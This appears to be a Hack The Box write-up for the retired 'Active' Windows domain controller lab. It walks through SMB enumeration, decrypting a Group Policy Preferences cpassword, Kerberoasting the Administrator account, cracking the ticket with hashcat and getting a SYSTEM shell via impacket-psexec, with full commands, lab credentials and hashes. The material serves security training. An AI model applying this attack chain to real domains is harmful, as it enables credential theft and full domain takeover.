![image.png](https://github.com/het-desai/hackthebox/blob/main/active/screenshots/image.png)

## Introduction

This walkthrough covers the exploitation of the "Active" machine from Hack The Box, which simulates a Windows Server environment integrated with Active Directory (AD). The challenge focuses on identifying and exploiting vulnerabilities within common AD services such as SMB, Kerberos, and Group Policy Preferences (GPP). The initial enumeration includes gathering information on open ports, services, and domain configurations. Techniques like SMB enumeration, Kerberos ticket extraction, and the exploitation of weak password policies are employed to gain initial access. Following this, privilege escalation methods like exploiting GPP credentials and leveraging AD misconfigurations are used to escalate privileges and obtain system-level access.

## Machine Enumeration

```
┌──(kali㉿kali)-[~/htb/Active]
└─$ nmap -Pn -sC -sV 10.10.10.100 -oN nmap.init.txt
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-03 13:39 EDT
Nmap scan report for 10.10.10.100
Host is up (0.099s latency).
Not shown: 982 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.1.7601 (1DB15D39) (Windows Server 2008 R2 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.1.7601 (1DB15D39)
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-03 17:39:08Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: active.htb, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  unknown
49155/tcp open  unknown
49157/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49158/tcp open  unknown
49165/tcp open  unknown
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008:r2:sp1, cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-05-03T17:40:21
|_  start_date: 2025-05-03T17:36:16
|_clock-skew: -4s
| smb2-security-mode: 
|   2:1:0: 
|_    Message signing enabled and required

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 133.08 seconds
```

```
┌──(kali㉿kali)-[~/htb/Active]
└─$ tail /etc/hosts -n 1                                          
10.10.10.100	active.htb
```

```
┌──(kali㉿kali)-[~/htb/Active]
└─$ smbmap -H 10.10.10.100 -P 445 

    ________  ___      ___  _______   ___      ___       __         _______
   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
-----------------------------------------------------------------------------
SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
                     https://github.com/ShawnDEvans/smbmap

[*] Detected 1 hosts serving SMB                                                                                                  
[*] Established 1 SMB connections(s) and 1 authenticated session(s)                                                      
                                                                                                                             
[+] IP: 10.10.10.100:445	Name: active.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	NO ACCESS	Remote IPC
	NETLOGON                                          	NO ACCESS	Logon server share 
	Replication                                       	READ ONLY	
	SYSVOL                                            	NO ACCESS	Logon server share 
	Users                                             	NO ACCESS	
[*] Closed 1 connections
```

```
┌──(kali㉿kali)-[~/htb/Active]
└─$ smbclient -L \\\\10.10.10.100\\           
Password for [WORKGROUP\kali]:
Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
	ADMIN$          Disk      Remote Admin
	C$              Disk      Default share
	IPC$            IPC       Remote IPC
	NETLOGON        Disk      Logon server share 
	Replication     Disk      
	SYSVOL          Disk      Logon server share 
	Users           Disk      
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.10.100 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

```
┌──(kali㉿kali)-[~/htb/Active]
└─$ smbclient \\\\10.10.10.100\\Replication 
Password for [WORKGROUP\kali]:
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sat Jul 21 06:37:44 2018
  ..                                  D        0  Sat Jul 21 06:37:44 2018
  active.htb
...
...
...
smb: \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\> get Groups.xml
getting file \active.htb\Policies\{31B2F340-016D-11D2-945F-00C04FB984F9}\MACHINE\Preferences\Groups\Groups.xml of size 533 as Groups.xml (1.6 KiloBytes/sec) (average 3.8 KiloBytes/sec)
```

Checked all internal directories but found noting interesting except `Groups.xml` file which has a username and cpassword hash.

```
┌──(kali㉿kali)-[~/htb/Active]
└─$ cat Groups.xml    
<?xml version="1.0" encoding="utf-8"?>
<Groups clsid="{3125E937-EB16-4b4c-9934-544FC6D24D26}"><User clsid="{DF5F1855-51E5-4d24-8B1A-D9BDE98BA1D1}" name="active.htb\SVC_TGS" image="2" changed="2018-07-18 20:46:06" uid="{EF57DA28-5F69-4530-A59E-AAB58578219D}"><Properties action="U" newName="" fullName="" description="" cpassword="edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ" changeLogon="0" noChange="1" neverExpires="1" acctDisabled="0" userName="active.htb\SVC_TGS"/></User>
</Groups>
```

Quick google search: `how to decrypt the cpassword`

![image.png](https://github.com/het-desai/hackthebox/blob/main/active/screenshots/image4.png)

![image.png](https://github.com/het-desai/hackthebox/blob/main/active/screenshots/image1.png)

```
┌──(kali㉿kali)-[~/htb/Active]
└─$ gpp_cpass_decrypt -c "edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ"
                                                                       
   ██████╗ ██████╗ ██████╗      ██████╗██████╗  █████╗ ███████╗███████╗
  ██╔════╝ ██╔══██╗██╔══██╗    ██╔════╝██╔══██╗██╔══██╗██╔════╝██╔════╝
  ██║  ███╗██████╔╝██████╔╝    ██║     ██████╔╝███████║███████╗███████╗
  ██║   ██║██╔═══╝ ██╔═══╝     ██║     ██╔═══╝ ██╔══██║╚════██║╚════██║
  ╚██████╔╝██║     ██║         ╚██████╗██║     ██║  ██║███████║███████║
   ╚═════╝ ╚═╝     ╚═╝          ╚═════╝╚═╝     ╚═╝  ╚═╝╚══════╝╚══════╝
                                                                       
             ██████╗ ███████╗ ██████╗██████╗ ██╗   ██╗██████╗ ████████╗
             ██╔══██╗██╔════╝██╔════╝██╔══██╗╚██╗ ██╔╝██╔══██╗╚══██╔══╝
             ██║  ██║█████╗  ██║     ██████╔╝ ╚████╔╝ ██████╔╝   ██║   
             ██║  ██║██╔══╝  ██║     ██╔══██╗  ╚██╔╝  ██╔═══╝    ██║   
             ██████╔╝███████╗╚██████╗██║  ██║   ██║   ██║        ██║   
             ╚═════╝ ╚══════╝ ╚═════╝╚═╝  ╚═╝   ╚═╝   ╚═╝        ╚═╝   
                                                                       
                  Author: Galoget Latorre - @galoget                   
                                                                       
 [!]  Entered Password: edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
 [+]  Decrypted Password: GPPstillStandingStrong2k18
```

## Initial Foothold

Add username and password into the respective files usernames.txt and passwords.txt

```
┌──(kali㉿kali)-[~/htb/Active]
└─$ crackmapexec smb 10.10.10.100 -u usernames.txt -p passwords.txt --shares
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
SMB         10.10.10.100    445    DC               [+] Enumerated shares
SMB         10.10.10.100    445    DC               Share           Permissions     Remark
SMB         10.10.10.100    445    DC               -----           -----------     ------
SMB         10.10.10.100    445    DC               ADMIN$                          Remote Admin
SMB         10.10.10.100    445    DC               C$                              Default share
SMB         10.10.10.100    445    DC               IPC$                            Remote IPC
SMB         10.10.10.100    445    DC               NETLOGON        READ            Logon server share 
SMB         10.10.10.100    445    DC               Replication     READ            
SMB         10.10.10.100    445    DC               SYSVOL          READ            Logon server share 
SMB         10.10.10.100    445    DC               Users           READ
```

```
┌──(kali㉿kali)-[~/htb/Active]
└─$ nxc smb 10.10.10.100 -u usernames.txt -p passwords.txt --users 
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
SMB         10.10.10.100    445    DC               -Username-                    -Last PW Set-       -BadPW- -Description-                                               
SMB         10.10.10.100    445    DC               Administrator                 2018-07-18 19:06:40 0       Built-in account for administering the computer/domain 
SMB         10.10.10.100    445    DC               Guest                         <never>             0       Built-in account for guest access to the computer/domain 
SMB         10.10.10.100    445    DC               krbtgt                        2018-07-18 18:50:36 0       Key Distribution Center Service Account 
SMB         10.10.10.100    445    DC               SVC_TGS                       2018-07-18 20:14:38 0        
SMB         10.10.10.100    445    DC               [*] Enumerated 4 local users: ACTIVE
```

```
┌──(kali㉿kali)-[~/htb/Active]
└─$ crackmapexec winrm 10.10.10.100 -u usernames.txt -p passwords.txt --continue-on-success

┌──(kali㉿kali)-[~/htb/Active]
└─$
```

```
┌──(kali㉿kali)-[~/htb/Active]
└─$ evil-winrm -i 10.10.10.100 -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18'
                                        
Evil-WinRM shell v3.7
                                        
Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc' for module Reline
                                        
Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
                                        
Info: Establishing connection to remote endpoint
                                        
Error: An error of type Errno::ECONNREFUSED happened, message is Connection refused - Connection refused - connect(2) for "10.10.10.100" port 5985 (10.10.10.100:5985)
                                        
Error: Exiting with code 1
```

winrm service is not access able. It is refusing our connection.

```
┌──(kali㉿kali)-[~/htb/Active]
└─$ smbclient \\\\10.10.10.100\\Users -U 'SVC_TGS'
Password for [WORKGROUP\SVC_TGS]:
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sat Jul 21 10:39:20 2018
  ..                                 DR        0  Sat Jul 21 10:39:20 2018
  Administrator                       D        0  Mon Jul 16 06:14:21 2018
  All Users                       DHSrn        0  Tue Jul 14 01:06:44 2009
  Default                           DHR        0  Tue Jul 14 02:38:21 2009
  Default User                    DHSrn        0  Tue Jul 14 01:06:44 2009
  desktop.ini                       AHS      174  Tue Jul 14 00:57:55 2009
  Public                             DR        0  Tue Jul 14 00:57:55 2009
  SVC_TGS                             D        0  Sat Jul 21 11:16:32 2018

		5217023 blocks of size 4096. 278980 blocks available
smb: \Administrator\> cd ../SVC_TGS
smb: \SVC_TGS\> dir
  .                                   D        0  Sat Jul 21 11:16:32 2018
  ..                                  D        0  Sat Jul 21 11:16:32 2018
  Contacts                            D        0  Sat Jul 21 11:14:11 2018
  Desktop                             D        0  Sat Jul 21 11:14:42 2018
  Downloads                           D        0  Sat Jul 21 11:14:23 2018
  Favorites                           D        0  Sat Jul 21 11:14:44 2018
  Links                               D        0  Sat Jul 21 11:14:57 2018
  My Documents                        D        0  Sat Jul 21 11:15:03 2018
  My Music                            D        0  Sat Jul 21 11:15:32 2018
  My Pictures                         D        0  Sat Jul 21 11:15:43 2018
  My Videos                           D        0  Sat Jul 21 11:15:53 2018
  Saved Games                         D        0  Sat Jul 21 11:16:12 2018
  Searches                            D        0  Sat Jul 21 11:16:24 2018

		5217023 blocks of size 4096. 278980 blocks available
smb: \SVC_TGS\> cd Desktop
smb: \SVC_TGS\Desktop\> dir
  .                                   D        0  Sat Jul 21 11:14:42 2018
  ..                                  D        0  Sat Jul 21 11:14:42 2018
  user.txt                           AR       34  Sat May  3 13:37:33 2025

		5217023 blocks of size 4096. 278980 blocks available
smb: \SVC_TGS\Desktop\> get user.txt
getting file \SVC_TGS\Desktop\user.txt of size 34 as user.txt (0.2 KiloBytes/sec) (average 0.2 KiloBytes/sec)
```

Checked other directories but found noting interesting but from the user name it sounds like a SPN of the AD user (SVC → SerViCe, TGS → Ticket Granted Service). Can’t able to login with credentials but externally enumerate using bloodhound-python.

```
┌──(kali㉿kali)-[~/htb/Active]
└─$ bloodhound-python -d 'active.htb' -u 'SVC_TGS' -p 'GPPstillStandingStrong2k18' -c all -ns 10.10.10.100 --zip 
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: active.htb
INFO: Getting TGT for user
WARNING: Failed to get Kerberos TGT. Falling back to NTLM authentication. Error: [Errno Connection error (dc.active.htb:88)] [Errno -2] Name or service not known
INFO: Connecting to LDAP server: dc.active.htb
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 1 computers
INFO: Connecting to LDAP server: dc.active.htb
INFO: Found 5 users
INFO: Found 41 groups
INFO: Found 2 gpos
INFO: Found 1 ous
INFO: Found 19 containers
INFO: Found 0 trusts
INFO: Starting computer enumeration with 10 workers
INFO: Querying computer: DC.active.htb
INFO: Done in 00M 09S
INFO: Compressing output into 20250503143805_bloodhound.zip
```

Could not find anything interesting with bloodhound with the current user. So, tried to get a shell using impacket-psexec but it won’t possible because don’t have a write permission on any accessible directory.

## Privilege Escalation

Quick google search: `TGS post exploitation`

![image.png](https://github.com/het-desai/hackthebox/blob/main/active/screenshots/image2.png)

![image.png](https://github.com/het-desai/hackthebox/blob/main/active/screenshots/image3.png)

Here I used a same tool with different version and way of using with impacket’s commands.

```
┌──(kali㉿kali)-[~/htb/Active]
└─$ impacket-GetUserSPNs -request -dc-ip 10.10.10.100 active.htb/SVC_TGS
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

Password:
ServicePrincipalName  Name           MemberOf                                                  PasswordLastSet             LastLogon                   Delegation 
--------------------  -------------  --------------------------------------------------------  --------------------------  --------------------------  ----------
active/CIFS:445       Administrator  CN=Group Policy Creator Owners,CN=Users,DC=active,DC=htb  2018-07-18 15:06:40.351723  2025-05-03 13:37:34.716174             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$c9816d924fdfbcbc6fc9cd3cb5d318e4$ef5ab545ebf4819ab46e2484ded58e7ad176544b0065c9eed8345da8853eeb5bf90305b1cd84df4691748ae41fb3e2f2820d576968604929b0b28ef31ce475aea1fbc67baa8ee7acbf40bdf742f2901f3e891aed6b71395a645e113557867c986b2622f4fb0bf2b1e06b9fdeb5de8a322f8b45e105871519558f1bc6ad2aaf9dfe4861c29048ef20ed6a3f207bff85ad89bb4df432420f1d3adbacf20399107009fba888d342c1c6359e26874d5ec1fb7ae9697a04d63292ab5ec6118582d778df1461f0ee1287f03ae53dc406bfe7214101b764f31365c2bad74ed2f228a1918cc2d3137c3206e5220b184d05e4541f8da1fbcead2ce0896b1d01fe1c8b91b6ae53f23b48e090d0744f8ee9a9fe11fa4b87531a56ee88710fa01e7f7783469641da7597103faf3c45c3ea9771e01d7528113dea980085f04efe61a59c088495634ab8280bc2ac4e58a596e321d12841d94aab5a513f925f545f046fc332e3efb959f8aeabe29ae89df8e4da7321abe307d036e65e0c5d0c1ce1ad82e171eb9fc319e2ed601b978d891d6cdae6dbebdb829d339b04b35a92c63b5d9d68cd267ae255b99eea644733ecb539000049c7f82fea80daededd4ec18c047cb45347620ad12edf0ec8c378d7aec8d6b30529c1853f85324ee872953dc52a7654428daa77841a25bc9955a13a4c7f87b220a226be4b08ca07374c9016859ae798404ccfcbc1778a2cf649064a9aa781f9efb9ab515d8b9070d0d922c223381f380f56fbeeb02f06e432834b87abb5ef044c81c6037f9ce1100494a4dc14ce6e038357fcbfb70d7cc5c46143f2597fa47134e1bb48edba526733fad7cfc2c4f62c009490d8f2e0bdcc21892002eeae4de6f6e1a3a3d928ab71d6030883bcef82e9a07cb172a10018c712bc0cf327ee71bbf42d05d1f45c1120cf946512760420bc563a1eedbd78015eee5a557389270a1e38426d76e178d5488fa9c473dbd1a73b09a995e64e632df4662f3563acd47c2238088bbb5525ecc82b11cfbb01b0c47f46757aff3e70294aadd1889e3eca7e6e3960f1ba521a4dc603f18ebac2fa08206ee4e31456b75ac903c1cdd9fb4dfd55b09c8da0eeec025830ce04ff26c63877ead31f2d08221a5d36dfcdd39e0246ed8799f231cc8bdd40d4077a8d3a662373a6a8b5cd5c24e3b41ec19b6268170560e421c54a87618f82f7ef52be9b2586ccd06380c8eac2eed0606a7a5521d072d8e1f97d0816cc5784fb2718082fd
```

```
┌──(kali㉿kali)-[~/htb/Active]
└─$ cat Administrator.txt                                                   
$krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Administrator*$c9816d924fdfbcbc6fc9cd3cb5d318e4$ef5ab545ebf4819ab46e2484ded58e7ad176544b0065c9eed8345da8853eeb5bf90305b1cd84df4691748ae41fb3e2f2820d576968604929b0b28ef31ce475aea1fbc67baa8ee7acbf40bdf742f2901f3e891aed6b71395a645e113557867c986b2622f4fb0bf2b1e06b9fdeb5de8a322f8b45e105871519558f1bc6ad2aaf9dfe4861c29048ef20ed6a3f207bff85ad89bb4df432420f1d3adbacf20399107009fba888d342c1c6359e26874d5ec1fb7ae9697a04d63292ab5ec6118582d778df1461f0ee1287f03ae53dc406bfe7214101b764f31365c2bad74ed2f228a1918cc2d3137c3206e5220b184d05e4541f8da1fbcead2ce0896b1d01fe1c8b91b6ae53f23b48e090d0744f8ee9a9fe11fa4b87531a56ee88710fa01e7f7783469641da7597103faf3c45c3ea9771e01d7528113dea980085f04efe61a59c088495634ab8280bc2ac4e58a596e321d12841d94aab5a513f925f545f046fc332e3efb959f8aeabe29ae89df8e4da7321abe307d036e65e0c5d0c1ce1ad82e171eb9fc319e2ed601b978d891d6cdae6dbebdb829d339b04b35a92c63b5d9d68cd267ae255b99eea644733ecb539000049c7f82fea80daededd4ec18c047cb45347620ad12edf0ec8c378d7aec8d6b30529c1853f85324ee872953dc52a7654428daa77841a25bc9955a13a4c7f87b220a226be4b08ca07374c9016859ae798404ccfcbc1778a2cf649064a9aa781f9efb9ab515d8b9070d0d922c223381f380f56fbeeb02f06e432834b87abb5ef044c81c6037f9ce1100494a4dc14ce6e038357fcbfb70d7cc5c46143f2597fa47134e1bb48edba526733fad7cfc2c4f62c009490d8f2e0bdcc21892002eeae4de6f6e1a3a3d928ab71d6030883bcef82e9a07cb172a10018c712bc0cf327ee71bbf42d05d1f45c1120cf946512760420bc563a1eedbd78015eee5a557389270a1e38426d76e178d5488fa9c473dbd1a73b09a995e64e632df4662f3563acd47c2238088bbb5525ecc82b11cfbb01b0c47f46757aff3e70294aadd1889e3eca7e6e3960f1ba521a4dc603f18ebac2fa08206ee4e31456b75ac903c1cdd9fb4dfd55b09c8da0eeec025830ce04ff26c63877ead31f2d08221a5d36dfcdd39e0246ed8799f231cc8bdd40d4077a8d3a662373a6a8b5cd5c24e3b41ec19b6268170560e421c54a87618f82f7ef52be9b2586ccd06380c8eac2eed0606a7a5521d072d8e1f97d0816cc5784fb2718082fd
```

```
┌──(kali㉿kali)-[~/htb/Active]
└─$ sudo hashcat -m 13100 Administrator.txt ~/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt --force
...
...
...
$krb5tgs...8082fd:Ticketmaster1968
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 13100 (Kerberos 5, etype 23, TGS-REP)
Hash.Target......: $krb5tgs$23$*Administrator$ACTIVE.HTB$active.htb/Ad...8082fd
Time.Started.....: Sat May  3 15:10:12 2025, (16 secs)
Time.Estimated...: Sat May  3 15:10:28 2025, (0 secs)
Kernel.Feature...: Pure Kernel
Guess.Base.......: File (/home/kali/tools/SecLists/Passwords/Leaked-Databases/rockyou.txt)
Guess.Queue......: 1/1 (100.00%)
Speed.#1.........:   657.4 kH/s (1.94ms) @ Accel:512 Loops:1 Thr:1 Vec:8
Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)
Progress.........: 10539008/14344384 (73.47%)
Rejected.........: 0/10539008 (0.00%)
Restore.Point....: 10536960/14344384 (73.46%)
Restore.Sub.#1...: Salt:0 Amplifier:0-1 Iteration:0-1
Candidate.Engine.: Device Generator
Candidates.#1....: Tiffany93 -> Thelink
Hardware.Mon.#1..: Util: 66%

Started: Sat May  3 15:10:10 2025
Stopped: Sat May  3 15:10:30 2025
```

```
┌──(kali㉿kali)-[~/htb/Active]
└─$ crackmapexec smb 10.10.10.100 -u usernames.txt -p passwords.txt --shares --continue-on-success
SMB         10.10.10.100    445    DC               [*] Windows 7 / Server 2008 R2 Build 7601 x64 (name:DC) (domain:active.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.100    445    DC               [+] active.htb\SVC_TGS:GPPstillStandingStrong2k18 
SMB         10.10.10.100    445    DC               [-] active.htb\SVC_TGS:Ticketmaster1968 STATUS_LOGON_FAILURE 
SMB         10.10.10.100    445    DC               [-] active.htb\Administrator:GPPstillStandingStrong2k18 STATUS_LOGON_FAILURE 
SMB         10.10.10.100    445    DC               [+] active.htb\Administrator:Ticketmaster1968 (Pwn3d!)
SMB         10.10.10.100    445    DC               [-] active.htb\Guest:GPPstillStandingStrong2k18 STATUS_LOGON_FAILURE 
SMB         10.10.10.100    445    DC               [-] active.htb\Guest:Ticketmaster1968 STATUS_LOGON_FAILURE 
SMB         10.10.10.100    445    DC               [-] active.htb\krbtgt:GPPstillStandingStrong2k18 STATUS_LOGON_FAILURE 
SMB         10.10.10.100    445    DC               [-] active.htb\krbtgt:Ticketmaster1968 STATUS_LOGON_FAILURE
```

```
┌──(kali㉿kali)-[~/htb/Active]
└─$ impacket-psexec 'active.htb'/'Administrator':'Ticketmaster1968'@'10.10.10.100' 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Requesting shares on 10.10.10.100.....
[*] Found writable share ADMIN$
[*] Uploading file eFlMKGzr.exe
[*] Opening SVCManager on 10.10.10.100.....
[*] Creating service ZErC on 10.10.10.100.....
[*] Starting service ZErC.....
[!] Press help for extra shell commands
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Windows\system32> whoami
nt authority\system

C:\Windows\system32> hostname
DC
```